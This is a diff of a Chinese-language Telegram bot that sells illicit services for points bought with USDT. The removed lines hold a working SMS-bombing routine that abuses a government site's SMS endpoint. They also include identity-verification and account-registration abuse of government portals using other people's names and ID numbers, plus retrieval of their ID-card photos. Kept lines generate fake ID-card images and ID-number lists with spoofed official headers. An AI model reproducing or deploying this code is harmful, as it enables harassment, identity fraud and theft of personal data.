@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import sys
-print("===== Bot 精简稳定版（新增 /sms 刷短信，计费每条约0.99积分）=====")
+print("===== Bot 精简稳定版（已移除 /hn /gx /sms /3ys，新增 /sjhsc /sfzsc 免费）=====")
 
 import os, subprocess
 
@@ -27,14 +27,6 @@ from reportlab.pdfgen import canvas
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Updater, CommandHandler, ConversationHandler, MessageHandler, Filters, CallbackQueryHandler
 from flask import Flask, request, jsonify
-
-# ---------- 新增：GMSSL 支持（三要素核验用到） ----------
-try:
-    from gmssl.sm2 import CryptSM2
-    GMSSL_AVAILABLE = True
-except ImportError:
-    GMSSL_AVAILABLE = False
-    print("⚠️ 未安装 gmssl，/3ys 命令将无法使用，请先 pip install gmssl")
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -62,15 +54,9 @@ CHECK_INTERVAL = 0.5
 ORDER_TIMEOUT = 1800
 ADMIN_IDS = [6040143940]
 
-# 收费常量（已修改）
-HN_COST = 1.0          # 海南查询（改为1积分）
-GX_COST = 999.0        # 广西查询
+# 收费常量（保留原有）
 KHZC_COST = 1.0        # 空号检测
 YS_COST = 1.0          # 二要素
-THREE_COST = 1.0       # 新增三要素核验
-
-# ---------- 三要素核验所需常量 ----------
-PUBLIC_KEY = "04be7a5cfde4e83a21efb711dec86f5e6b253a9e3927540bf854439229e2e7eb1cd0dc3de522c90eb7ab639d93094fac219ffcde544c39ec2bd908436fa35f0088"
 
 # ===== JSON存储 =====
 USERS_FILE = "users.json"
@@ -79,18 +65,16 @@ USERS_BACKUP = "users.json.bak"
 def load_users():
     global users
     users = {}
-    # 尝试读取主文件
     if os.path.exists(USERS_FILE):
         try:
             with open(USERS_FILE, "r") as f:
                 users = json.load(f)
             if isinstance(users, dict):
                 print(f"✅ 成功加载 {len(users)} 个用户")
-                save_users()  # 自动备份
+                save_users()
                 return
         except Exception as e:
             print(f"⚠️ 读取 users.json 失败: {e}")
-            # 主文件损坏，尝试从备份恢复
             if os.path.exists(USERS_BACKUP):
                 try:
                     with open(USERS_BACKUP, "r") as f:
@@ -100,17 +84,14 @@ def load_users():
                         with open(USERS_FILE, "w") as f:
                             json.dump(users, f, indent=2)
                         return
-                except Exception as e2:
-                    print(f"⚠️ 备份文件也损坏: {e2}")
-            # 如果备份也失败，将损坏的主文件重命名，然后新建空文件
+                except:
+                    pass
             if os.path.exists(USERS_FILE):
                 os.rename(USERS_FILE, USERS_FILE + ".corrupt")
                 print("⚠️ 已备份损坏文件为 users.json.corrupt")
             users = {}
             save_users()
-            print("⚠️ 已创建新的空用户文件（因为原文件损坏）")
     else:
-        # 主文件不存在，尝试从备份恢复
         if os.path.exists(USERS_BACKUP):
             try:
                 with open(USERS_BACKUP, "r") as f:
@@ -122,7 +103,6 @@ def load_users():
                     return
             except:
                 pass
-        # 没有任何有效数据，创建新文件
         users = {}
         save_users()
         print("⚠️ 未找到用户数据，创建新文件")
@@ -161,7 +141,7 @@ def get_font(font_path, size):
         _FONT_CACHE[key] = ImageFont.truetype(font_path, size)
     return _FONT_CACHE[key]
 
-# ===== 身份证生成（略，不变） =====
+# ===== 身份证生成（原 /sfz 功能） =====
 HEADERS1 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","zwfw-token":ZWFW_TOKEN,"User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","content-type":"application/json","sec-ch-ua-mobile":"?1","Accept":"*/*","Origin":"https://zwfw.dn.haikou.gov.cn","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
 HEADERS2 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","sec-ch-ua-mobile":"?1","Accept":"*/*","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
 def query_id_card_sync(id_card):
@@ -411,15 +391,15 @@ def run_flask(): flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloa
 RECHARGE_AMOUNT = 1
 QF_QQ = 100
 YS_NAME, YS_ID = range(200, 202)
-SMS_CHOICE = 300
-GX_NAME, GX_ID, GX_PHONE, GX_CAPTCHA, GX_SMS = range(400, 405)
 KHZC_PHONE = 500
 SFZ_NAME,SFZ_ID,SFZ_NATION,SFZ_ADDR,SFZ_EXPIRY,SFZ_PHOTO=range(6)
 PLC_NAME,PLC_ID,PLC_ADDR_CONFIRM,PLC_ADDR_MANUAL,PLC_PHOTO=range(10,15)
-# ---------- 新增三要素状态 ----------
-THREE_NAME, THREE_PHONE, THREE_ID = range(600, 603)
 
-# ===== 代理池功能（修改为只测前3个） =====
+# ---------- 新增免费命令状态 ----------
+SJHSC_TEMPLATE, SJHSC_LOCATION = range(700, 702)
+SFZSC_NAME, SFZSC_TEMPLATE, SFZSC_GENDER = range(703, 706)
+
+# ===== 代理池功能 =====
 def test_proxy(proxy):
     try:
         proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
@@ -466,13 +446,11 @@ def start(update, context):
            f"可用命令：\n"
            f"/sfz → 生成双面身份证（免费）\n"
            f"/plc → 生成PLC个户（免费）\n"
-           f"/hn → 海南头（{HN_COST}积分）\n"
-           f"/gx → 广西头（{GX_COST}积分）\n"
+           f"/sjhsc → 手机号段生成器（免费）\n"
+           f"/sfzsc → 身份证号列表生成（免费）\n"
            f"/khzc → 空号检测（{KHZC_COST}积分）\n"
            f"/2ys → 二要素核实（{YS_COST}积分）\n"
-           f"/3ys → 三要素核验（{THREE_COST}积分）\n"  # 新增
            f"/qf → QQ反查历史\n"
-           f"/sms → 短信轰炸\n"
            f"/okcz → USDT充值积分\n"
            f"/cx → 查询余额\n"
            f"/zs → 管理员赠送积分\n"
@@ -601,7 +579,7 @@ def okcz_amount(update, context):
     update.message.reply_text(f"✅ 订单已创建\n订单号: {order_id}\n金额: {amt:.2f} USDT → {points:.2f} 积分\n点击按钮支付", reply_markup=InlineKeyboardMarkup(keyboard))
     return ConversationHandler.END
 
-# ===== sfz 生成身份证 =====
+# ===== sfz 生成身份证（图片+PDF） =====
 def sfz_start(update,context):
     context.user_data.clear()
     update.message.reply_text("请输入姓名：")
@@ -810,7 +788,7 @@ def qf_qq(update, context):
     context.user_data.clear()
     return ConversationHandler.END
 
-# ===== /2ys 二要素（扣费1积分） =====
+# ===== /2ys 二要素 =====
 def ys_start(update, context):
     context.user_data.clear()
     update.message.reply_text("请输入姓名：")
@@ -896,676 +874,6 @@ def ys_id(update, context):
     context.user_data.clear()
     return ConversationHandler.END
 
-# ===== /3ys 三要素核验（新增，1积分/次） =====
-def three_start(update, context):
-    context.user_data.clear()
-    uid = update.effective_user.id
-    ensure_user(uid)
-    stats = get_user_stats(uid)
-    if stats['points'] < THREE_COST:
-        update.message.reply_text(f"❌ 积分不足，需要 {THREE_COST} 积分，当前 {stats['points']:.2f}")
-        return ConversationHandler.END
-    # 先扣除积分
-    users[str(uid)]['points'] = stats['points'] - THREE_COST
-    save_users()
-    update.message.reply_text(f"✅ 已扣除 {THREE_COST} 积分，剩余 {users[str(uid)]['points']:.2f}\n请输入姓名：")
-    return THREE_NAME
-
-def three_name(update, context):
-    if update.message.text and update.message.text.startswith('/'):
-        context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消")
-        return ConversationHandler.END
-    name = update.message.text.strip()
-    if not name:
-        update.message.reply_text("姓名不能为空，请重新输入：")
-        return THREE_NAME
-    context.user_data['three_name'] = name
-    update.message.reply_text("请输入手机号（11位）：")
-    return THREE_PHONE
-
-def three_phone(update, context):
-    if update.message.text and update.message.text.startswith('/'):
-        context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消")
-        return ConversationHandler.END
-    phone = update.message.text.strip()
-    if not phone.isdigit() or len(phone) != 11:
-        update.message.reply_text("手机号格式错误（需11位数字），请重新输入：")
-        return THREE_PHONE
-    context.user_data['three_phone'] = phone
-    update.message.reply_text("请输入18位身份证号：")
-    return THREE_ID
-
-def three_id(update, context):
-    if update.message.text and update.message.text.startswith('/'):
-        context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消")
-        return ConversationHandler.END
-    id_card = update.message.text.strip().upper()
-    if len(id_card) != 18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
-        update.message.reply_text("身份证号格式错误，请重新输入：")
-        return THREE_ID
-
-    # 收集所有信息
-    name = context.user_data.get('three_name')
-    phone = context.user_data.get('three_phone')
-    if not name or not phone:
-        update.message.reply_text("会话信息丢失，请重新 /3ys")
-        context.user_data.clear()
-        return ConversationHandler.END
-
-    # 执行核验
-    update.message.reply_text("⏳ 正在核验运营商三要素，请稍候...")
-    result_msg = check_three_elements(name, phone, id_card)
-    update.message.reply_text(result_msg)
-    context.user_data.clear()
-    return ConversationHandler.END
-
-def check_three_elements(name, phone, id_card):
-    """调用运营商三要素核验接口"""
-    if not GMSSL_AVAILABLE:
-        return "❌ 缺少 gmssl 库，无法加密，请先 pip install gmssl"
-    try:
-        sm2 = CryptSM2(public_key=PUBLIC_KEY, private_key="")
-        sm2.mode = 1
-        def encrypt(plain: str) -> str:
-            return "04" + sm2.encrypt(plain.encode("utf-8")).hex()
-
-        url = "https://app.btzwfw.cn/api/open-api/sso/app/oauth2/register"
-        headers = {
-            "Content-Type": "application/json",
-            "platform": "mp-weixin",
-            "cudt-app": "unicom",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 MicroMessenger/7.0.20.1781 MiniProgramEnv/Windows",
-        }
-        body = {
-            "person": {
-                "name": encrypt(name),
-                "idName": encrypt(name),
-                "idType": "111",
-                "idCardNum": encrypt(id_card),
-                "idPhone": encrypt(phone),
-                "idPwd": encrypt("Abc@123456"),
-                "confirmPwd": encrypt("Abc@123456"),
-                "userSex": "M",
-                "gender": "M",
-                "effDate": "2023-01-01",
-                "expDate": "2043-01-01",
-                "msgId": "04843730249223a7adfc20ed56681bbf8e8c2baa1c83fadd849c27c741c0c8d230ef3d1a2f9052b85611db728f2465b24cbaed9a0cb0953bb5d103879f5617b0c76aff530b65f976acbd6e1bf43ddadc71a381e83b0dd0736317a6b01c03e9ef8a2fb2c08f1a832dbaddf3e9630378c5ec4b315c4b5011ad3aee2c0fdbe1fd9dfe",
-                "smsCode": "04322e8f0ab6f5e71562c69625edf58557dbdce2d4bdb40e3389e2b1b05cc39f5de54d8f040ac7be1d3df860c27bf0fbfa7792c5f3a197dd89237942922c450424593cec0f8d9931fcca804dd7c5544f5eea3a54b4e0835b9fed13aee3c8f374376c7bd3f8f6ea",
-                "source": "7",
-            },
-            "userType": "1",
-        }
-        resp = requests.post(url, json=body, headers=headers, timeout=30)
-        data = resp.json()
-        code = data.get("code")
-        status = data.get("status")
-        msg = data.get("message") or data.get("msg", "")
-
-        if status == "success" and code != 500:
-            return f"✅ {name} {phone} {id_card} 运营商三要素核验成功 {msg}"
-        else:
-            return f"❌ {name} {phone} {id_card} 运营商三要素核验失败 {msg}"
-    except Exception as e:
-        return f"❌ {name} {phone} {id_card} 核验出错：{str(e)}"
-
-# ===== /sms 短信轰炸 =====
-def do_sms_attack(chat_id, bot, target_count, phone, user_id):
-    import random
-    token_url = "https://ggzyjy.jxsggzy.cn/jxtoolws/rest/jxpWvCharService/getWvCharToken"
-    sms_url = "https://ggzyjy.jxsggzy.cn/jxtoolws/rest/mobile/user/sendMessage"
-    proxies = {}
-    if os.environ.get('HTTP_PROXY'):
-        proxies['http'] = os.environ.get('HTTP_PROXY')
-    if os.environ.get('HTTPS_PROXY'):
-        proxies['https'] = os.environ.get('HTTPS_PROXY')
-    ua_list = [
-        "Mozilla/5.0 (Linux; Android 14; RMX3920 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380353 MMWEBSDK/20240405 MMWEBID/8255 MicroMessenger/Lite Luggage/4.2.7 QQ/9.3.10.37675 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.180 Mobile Safari/537.36",
-    ]
-    session = requests.Session()
-    session.headers.update({
-        "Accept": "*/*",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
-        "Connection": "keep-alive",
-        "Content-Type": "application/json",
-        "Referer": "https://servicewechat.com/wxeaf18610dab623b7/2/page-frame.html",
-        "Host": "ggzyjy.jxsggzy.cn",
-        "Origin": "https://ggzyjy.jxsggzy.cn",
-        "User-Agent": random.choice(ua_list),
-        "X-Requested-With": "XMLHttpRequest",
-    })
-    token_payload = {"appkey": "TPBidder"}
-    count = 0; success_count = 0; fail_count = 0; error_reported = False
-    try:
-        while count < target_count:
-            count += 1
-            try:
-                session.headers.update({"User-Agent": random.choice(ua_list)})
-                token_res = session.post(token_url, json=token_payload, timeout=5, verify=False, proxies=proxies)
-                if token_res.status_code != 200:
-                    fail_count += 1
-                    if not error_reported and count <= 3:
-                        bot.send_message(chat_id, f"❌ Token获取失败，状态码{token_res.status_code}")
-                        error_reported = True
-                    time.sleep(1); continue
-                data = token_res.json()
-                if "custom" not in data or "token" not in data["custom"]:
-                    fail_count += 1
-                    if not error_reported and count <= 3:
-                        bot.send_message(chat_id, f"❌ Token响应格式异常")
-                        error_reported = True
-                    time.sleep(1); continue
-                token = data["custom"]["token"]
-                sms_payload = {"token": token, "params": {"mobilephone": phone}}
-                sms_res = session.post(sms_url, json=sms_payload, timeout=5, verify=False, proxies=proxies)
-                if sms_res.status_code == 200:
-                    sms_json = sms_res.json()
-                    if sms_json.get('code') == 0:
-                        success_count += 1
-                    else:
-                        fail_count += 1
-                        if not error_reported and count <= 3:
-                            bot.send_message(chat_id, f"❌ 短信失败：code={sms_json.get('code')}")
-                            error_reported = True
-                else:
-                    fail_count += 1
-                    if not error_reported and count <= 3:
-                        bot.send_message(chat_id, f"❌ 短信接口HTTP {sms_res.status_code}")
-                        error_reported = True
-            except Exception as e:
-                fail_count += 1
-                if not error_reported and count <= 3:
-                    bot.send_message(chat_id, f"❌ 异常：{e}")
-                    error_reported = True
-                time.sleep(1); continue
-            time.sleep(1.0)
-            if count % 10 == 0 or count == target_count:
-                bot.send_message(chat_id, f"📤 进度：{count}/{target_count} 成功{success_count} 失败{fail_count}")
-        bot.send_message(chat_id, f"✅ 刷短信完成！成功{success_count}条，失败{fail_count}条。")
-    except Exception as e:
-        bot.send_message(chat_id, f"❌ 刷短信过程中出错：{e}")
-
-def sms_start(update, context):
-    context.user_data.clear()
-    keyboard = [
-        [InlineKeyboardButton("100条", callback_data="sms_100"),
-         InlineKeyboardButton("200条", callback_data="sms_200"),
-         InlineKeyboardButton("300条", callback_data="sms_300")],
-        [InlineKeyboardButton("400条", callback_data="sms_400"),
-         InlineKeyboardButton("500条", callback_data="sms_500"),
-         InlineKeyboardButton("1000条", callback_data="sms_1000")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    update.message.reply_text("请选择要发送的短信条数（每条消耗0.99积分）：", reply_markup=reply_markup)
-    return SMS_CHOICE
-
-def sms_choice_callback(update, context):
-    query = update.callback_query
-    query.answer()
-    data = query.data
-    if not data.startswith("sms_"):
-        return
-    count = int(data.split("_")[1])
-    cost = round(count * 0.99, 2)
-    user_id = query.from_user.id
-    ensure_user(user_id)
-    stats = get_user_stats(user_id)
-    if stats['points'] < cost:
-        query.edit_message_text(f"❌ 积分不足，需要 {cost:.2f} 积分，当前 {stats['points']:.2f}")
-        return ConversationHandler.END
-    users[str(user_id)]['points'] = stats['points'] - cost
-    save_users()
-    query.edit_message_text(f"✅ 已扣除 {cost:.2f} 积分，剩余 {users[str(user_id)]['points']:.2f} 积分。\n请输入手机号（11位）：")
-    context.user_data['sms_count'] = count
-    context.user_data['sms_cost'] = cost
-    context.user_data['awaiting_phone'] = True
-    return SMS_CHOICE
-
-def sms_phone_input(update, context):
-    if not context.user_data.get('awaiting_phone'):
-        update.message.reply_text("请先使用 /sms 命令选择条数。")
-        return ConversationHandler.END
-    phone = update.message.text.strip()
-    if not phone.isdigit() or len(phone) != 11:
-        update.message.reply_text("❌ 手机号必须是11位数字，请重新输入：")
-        return SMS_CHOICE
-    count = context.user_data.get('sms_count')
-    if not count:
-        update.message.reply_text("❌ 会话超时，请重新 /sms")
-        return ConversationHandler.END
-    user_id = update.effective_user.id
-    bot = context.bot
-    chat_id = update.effective_chat.id
-    threading.Thread(target=do_sms_attack, args=(chat_id, bot, count, phone, user_id), daemon=True).start()
-    update.message.reply_text(f"🚀 开始刷短信，目标 {count} 条，请稍候... 进度会每10条通知一次。")
-    context.user_data.clear()
-    return ConversationHandler.END
-
-def sms_cancel(update, context):
-    context.user_data.clear()
-    update.message.reply_text("已取消刷短信")
-    return ConversationHandler.END
-
-# ===== /gx 广西道路运输（原 /gxlys） =====
-SM4_KEY = "CatsPK0WWWRRhjkw"
-SboxTable = [
-    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
-    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
-    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
-    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
-    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
-    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
-    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
-    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
-    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
-    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
-    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
-    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
-    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
-    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
-    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
-    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48
-]
-FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]
-CK = [
-    0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,
-    0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,
-    0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,
-    0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,
-    0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,
-    0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,
-    0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,
-    0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279
-]
-def rotl(x, n):
-    left = (x << n) & 0xffffffff
-    signed_x = x - 0x100000000 if (x & 0x80000000) else x
-    right = (signed_x >> (32 - n)) & 0xffffffff
-    return left | right
-def sm4_sbox(a):
-    return (SboxTable[(a >> 24) & 0xFF] << 24) | \
-           (SboxTable[(a >> 16) & 0xFF] << 16) | \
-           (SboxTable[(a >> 8) & 0xFF] << 8) | \
-           SboxTable[a & 0xFF]
-def sm4_lt(ka):
-    bb = sm4_sbox(ka)
-    return bb ^ rotl(bb, 2) ^ rotl(bb, 10) ^ rotl(bb, 18) ^ rotl(bb, 24)
-def sm4_calci_rk(ka):
-    bb = sm4_sbox(ka)
-    return bb ^ rotl(bb, 13) ^ rotl(bb, 23)
-def sm4_f(x0, x1, x2, x3, rk):
-    return x0 ^ sm4_lt(x1 ^ x2 ^ x3 ^ rk)
-def pkcs7_pad(data: bytes, block_size=16) -> bytes:
-    pad_len = block_size - (len(data) % block_size)
-    return data + bytes([pad_len]) * pad_len
-def sm4_encrypt_ecb(plain_text: str) -> str:
-    data = plain_text.encode('utf-8')
-    padded = pkcs7_pad(data, 16)
-    key_bytes = SM4_KEY.encode('utf-8')
-    mk = [0] * 4
-    for i in range(4):
-        mk[i] = (key_bytes[i*4] << 24) | (key_bytes[i*4+1] << 16) | (key_bytes[i*4+2] << 8) | key_bytes[i*4+3]
-    k = [0] * 36
-    for i in range(4):
-        k[i] = mk[i] ^ FK[i]
-    sk = [0] * 32
-    for i in range(32):
-        k[i+4] = k[i] ^ sm4_calci_rk(k[i+1] ^ k[i+2] ^ k[i+3] ^ CK[i])
-        sk[i] = k[i+4]
-    result = bytearray()
-    for offset in range(0, len(padded), 16):
-        block = padded[offset:offset+16]
-        x = [0] * 36
-        for i in range(4):
-            x[i] = (block[i*4] << 24) | (block[i*4+1] << 16) | (block[i*4+2] << 8) | block[i*4+3]
-        for i in range(32):
-            x[i+4] = sm4_f(x[i], x[i+1], x[i+2], x[i+3], sk[i])
-        out = bytearray(16)
-        for i in range(4):
-            val = x[35-i]
-            out[i*4] = (val >> 24) & 0xFF
-            out[i*4+1] = (val >> 16) & 0xFF
-            out[i*4+2] = (val >> 8) & 0xFF
-            out[i*4+3] = val & 0xFF
-        result.extend(out)
-    return base64.b64encode(result).decode('utf-8')
-
-GX_BASE_URL = "http://www.gxdlys.com"
-GX_PASSWORD = "268428."
-GX_HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36",
-    "X-Requested-With": "XMLHttpRequest",
-    "Accept": "application/json, text/javascript, */*; q=0.01",
-    "Accept-Encoding": "gzip, deflate",
-    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
-    "Connection": "keep-alive",
-    "Referer": "http://www.gxdlys.com/Wechat/User/Regist",
-}
-def gx_get_captcha(session):
-    try:
-        url = GX_BASE_URL + "/Wechat/FaceDetect/GetVerifyCode"
-        resp = session.get(url, headers=GX_HEADERS, timeout=10)
-        if resp.status_code != 200:
-            return None, None
-        data = resp.json()
-        if data.get("statusCode") != 200:
-            return None, None
-        img_b64 = data.get("data", {}).get("img")
-        uuid = data.get("data", {}).get("uuid")
-        if not img_b64 or not uuid:
-            return None, None
-        return img_b64, uuid
-    except Exception as e:
-        logger.error(f"获取图形验证码异常: {e}")
-        return None, None
-def gx_send_sms(session, phone, captcha_code, uuid):
-    data = {
-        "phoneId": phone,
-        "type": "10001",
-        "IsEncryptPhoneId": "false",
-        "verifyCode": captcha_code,
-        "uuid": uuid
-    }
-    try:
-        r = session.post(GX_BASE_URL + "/System/SmsService/PostVerifyCode",
-                         data=data,
-                         headers={**GX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://www.gxdlys.com/Wechat/User/Regist"},
-                         timeout=60)
-        if r.status_code == 200:
-            res = r.json()
-            return res.get("statusCode") == 200, res.get("info", "未知错误")
-        return False, f"HTTP {r.status_code}"
-    except Exception as e:
-        return False, str(e)
-def gx_register(session, phone, sms_code, captcha_code, real_name, id_card):
-    data = {
-        "zipArea": "",
-        "userType": "-1",
-        "wechatUid": "",
-        "realName": real_name,
-        "iDCard": id_card,
-        "loginName": id_card,
-        "password": GX_PASSWORD,
-        "idcardImg1Url": "218,8a785f252c8518",
-        "idcardImg2Url": "216,8a7860c46589f3",
-        "idcardImg3Url": "214,8a78664776227f",
-        "idcardImg4Url": "",
-        "ownerId": "",
-        "tel": phone,
-        "isTelEncrypted": "false",
-        "validCode": sms_code,
-        "verifyCode": captcha_code
-    }
-    try:
-        r = session.post(GX_BASE_URL + "/Wechat/User/RegistAdd",
-                         data=data,
-                         headers={**GX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://www.gxdlys.com/Wechat/User/Regist"},
-                         timeout=60)
-        if r.status_code == 200:
-            res = r.json()
-            return res.get("statusCode") == 200, res.get("info", "未知错误")
-        return False, f"HTTP {r.status_code}"
-    except Exception as e:
-        return False, str(e)
-def gx_login(session, id_card, password):
-    encrypted_login_raw = sm4_encrypt_ecb(id_card)
-    encrypted_pwd_raw = sm4_encrypt_ecb(password)
-    encrypted_login = urllib.parse.quote(encrypted_login_raw)
-    encrypted_pwd = urllib.parse.quote(encrypted_pwd_raw)
-    data = f"loginName={encrypted_login}&password={encrypted_pwd}&wechatUid="
-    login_headers = {**GX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://www.gxdlys.com/Wechat/Home/Login", "Host": "www.gxdlys.com"}
-    try:
-        response = session.post("http://www.gxdlys.com/Wechat/Home/PostLogin", headers=login_headers, data=data, timeout=60)
-        if response.status_code == 200:
-            res = response.json()
-            status = res.get("statusCode")
-            info = res.get("info", "")
-            if status == 200:
-                return True, "登录成功"
-            else:
-                return False, info
-        return False, f"HTTP {response.status_code}"
-    except Exception as e:
-        return False, str(e)
-def gx_query_photo(session, name, id_card):
-    try:
-        encoded_name = urllib.parse.quote(name)
-        url = f"{GX_BASE_URL}/Wechat/FaceDetect/GetGAIDCardPhotoNew?idCard={id_card}&name={encoded_name}"
-        query_headers = {**GX_HEADERS, "Referer": "http://www.gxdlys.com/Wechat/EcertCert/ECertApply?OperateType=0&BnsAcceptId=&ObjectId=&BasicBnsId=46011&Params=%E7%BB%8F%E8%90%A5%E6%80%A7%E9%81%93%E8%B7%AF%E8%B4%A7%E7%89%A9%E8%BF%90%E8%BE%93%E9%A9%BE%E9%A9%B6%E5%91%98&Step=1", "Host": "www.gxdlys.com"}
-        response = session.get(url, headers=query_headers, timeout=60)
-        if response.status_code != 200:
-            return False, f"HTTP {response.status_code}"
-        result = response.json()
-        if result.get("statusCode") == 200:
-            return True, result.get("data", {})
-        else:
-            return False, result.get("info", "未知错误")
-    except Exception as e:
-        return False, str(e)
-def gx_download_photo(session, file_id):
-    try:
-        url = f"{GX_BASE_URL}/System/FileService/ShowFile?fileId={file_id}"
-        response = session.get(url, timeout=60)
-        if response.status_code == 200 and 'image' in response.headers.get('Content-Type', ''):
-            return response.content
-        return None
-    except Exception as e:
-        logger.error(f"下载照片异常: {e}")
-        return None
-def gx_format_info(item2):
-    xm = item2.get("xm", "").strip()
